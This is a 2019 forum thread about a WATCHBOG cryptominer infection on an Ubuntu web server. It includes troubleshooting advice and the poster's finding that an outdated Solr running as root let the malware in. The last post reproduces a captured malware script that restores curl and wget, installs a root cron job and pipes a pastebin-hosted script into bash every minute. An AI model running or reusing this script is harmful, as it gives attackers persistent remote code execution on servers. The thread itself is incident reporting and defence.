---
title: "WATCHBOG virus"
date: 2019-01-11
forum: Security
---

### Post by r.tihovs on 2019-01-11
Hello!


There is a new virus out there which creates a proccess called "WATCHBOG" and eats all CPU from the server, after further investigation, i found out that this virus is mining cryptocurrency.

Full story:

Server specs: 
OS: Ubuntu server 16.04.5 LTS
Software: Apache2 with virtualhosts, MYSQL, PHP5.6, PHP7

When i found out that this web-server is infected, web pages still worked but awfully slow.
So the first thing i see is watchbog process which eats all CPU, so i tried to kill it but it reapears instantly, and everything is so slow that it is almost impossible to operate the server.
Next what i thought- "ok i need to terminate this process" So i thought i will put "* * * * * killall watchbog" in crontab , so i opened crontab, 
and found out that its compromised as well, so i removed this new entry from crontab, i deleted the watchbog file, and after a minute or two everything magically reappeared.
Crontab got compromised again to run some kind of remote script and the watchbog process was up and eating cpu again.

I tried to find anything usefull on the web, and found these articles:

Heres is the most helpfull one: 
[https://sudhakarbellamkonda.blogspot.com/2018/11/blocking-watchbog-malwareransomware.html?showComment=1547197914237#c3520750061219193777](https://sudhakarbellamkonda.blogspot.com/2018/11/blocking-watchbog-malwareransomware.html?showComment=1547197914237#c3520750061219193777)

After following this article the watchbog virus still reappeared :(
So i came up with this solution:
open a screen session as root and then run this loop: ( [FONT=Arial]while true ; do killall watchbog ; done )
[/FONT]and leave it running in background by detaching screen session with CTRL+A+D.
I posted as well this solution in that blog.
and here is one other post, but nothing really is helpful there :( 
[https://unix.stackexchange.com/questions/487437/a-strange-process-called-watchbog-is-hogging-my-entire-cpu-and-i-cant-get-rid](https://unix.stackexchange.com/questions/487437/a-strange-process-called-watchbog-is-hogging-my-entire-cpu-and-i-cant-get-rid)

So i tried fighting this virus many ways, changed passwords, reinstalled SSH, e.t.c. and no luck
Meanwhile i created a new Ubuntu server with the latest 18.04.1 LTS
We installed all latest webserver stuff, enabled UFW, opened web and ftp ports.
then migrated WWW data and SQL, changed IP back to original servers IP, and..... there it is AGAIN :(
[B]The virus came back on the new machine
[/B]so i think probably this virus infects the system by using some vulnerability in web-server software, but really, i dont know, and i cant find out, and im not the only one trying.

Please HELP :) !

P.S.
This is my first post, judge me softly please ;-)

---

### Post by TheFu on 2019-01-11
There are 6 different places where a crontab entry can happen.
If you use PHP webapps, patch, daily, and keep the file permissions tight.  If you have 777 permissions anywhere, that is a failure.  /tmp/ can have the sticky bit and 777 permissions, but that is a special case.

Don't use plain FTP unless you want to share your login credentials.  Use sftp.
UFW is an end-user interface to the kernel firewall and for places with trivial firewall needs.  If you need anything slightly complex, use iptables as the interface.  Don't mix ufw and iptables. That just leads to confusion.

Killing the process, but leaving the program is a failure.  Remove the program first, block the location where it gets downloaded from and only then kill the process.  Might be easiest to do this from alternate boot media (or a repair console on a VPS).

If you don't have versioned backups, I don't know how you could see which files where modified over time and 100% know where the crypto code and supporting scripts were located on the system.  Is it also possible to hide the program by downloading it, starting the process, then deleting the program from the file location.  You can check /proc/fd/ ... for the program.

To find the location where the program keeps getting downloaded from, at least for the next few hours, put the firewall into logging mode.

Again, if you aren't 100% certain that you've cleaned everything by using versioned backups as a comparison, I'd wipe the machine and start over.  This time, lock it down, good.

---

### Post by r.tihovs on 2019-01-11
[COLOR=#242729][FONT=Arial]Finally we found the vulnerability![/FONT][/COLOR]
[COLOR=#242729][FONT=Arial]The cause was SOLR search engine module ( [http://lucene.apache.org/solr/](http://lucene.apache.org/solr/)), it was outdated and had root permissions, after removing it, the virus is not reappearing any more. So now the plan is to start from scratch and hope its over...

The virus compromised WGET AND CURL also

[/FONT][/COLOR]
Heres one of the distribution scripts:

import subprocess
import os
import os.path


def GetDeps():
    if os.path.exists('/usr/bin/url') and os.path.isfile('/usr/bin/url'):
        os.system("mv /usr/bin/url /usr/bin/curl")
        os.system("chmod 777 /usr/bin/curl")
        os.system("chmod +x /usr/bin/curl")
    if os.path.exists('/usr/bin/2curl') and os.path.isfile('/usr/bin/2curl'):
        os.system("mv /usr/bin/2curl /usr/bin/curl")
        os.system("chmod 777 /usr/bin/curl")
        os.system("chmod +x /usr/bin/curl")
    if os.path.exists('/usr/bin/get') and os.path.isfile('/usr/bin/get'):
        os.system("mv /usr/bin/get /usr/bin/wget")
        os.system("chmod 777 /usr/bin/wget")
        os.system("chmod +x /usr/bin/wget")
    if os.path.exists('/usr/bin/2wget') and os.path.isfile('/usr/bin/2wget'):
        os.system("mv /usr/bin/2wget /usr/bin/wget")
        os.system("chmod 777 /usr/bin/wget")
        os.system("chmod +x /usr/bin/wget")
    if not os.path.exists('/usr/bin/wget') and os.path.isfile('/usr/bin/wget'):
        os.system("yum -y update")
        os.system("yum -y install wget")
        os.system("yum clean all")
        os.system("apt-get update")
        os.system("apt-get -y install wget")
    print 'Wget Exists'
    if not os.path.exists('/usr/bin/curl') and os.path.isfile('/usr/bin/curl'):
        os.system("yum -y update")
        os.system("yum -y install curl")
        os.system("yum clean all")
        os.system("apt-get update")
        os.system("apt-get -y install curl")
    print 'Curl Exists'


GetDeps()
os.system('rm -rf /etc/cron.d/root')
os.system('mkdir -p /etc/cron.d/')
f = open('/etc/cron.d/root', 'w')
f.write("*/1 * * * * root (curl -fsSL [https://pastebin.com/raw/EpLA3n3P||wget](https://pastebin.com/raw/EpLA3n3P||wget) -q -O- https://pastebin.com/raw/EpLA3n3P)|bash")
#
f.close()
#
os.system("(curl -fsSL [https://pastebin.com/raw/EpLA3n3P||wget](https://pastebin.com/raw/EpLA3n3P||wget) -q -O- https://pastebin.com/raw/EpLA3n3P)|bash")
#
#

---

### Post by TheFu on 2019-01-11
chmod 777

'nuff said.  That script was written by a noob, btw.

---

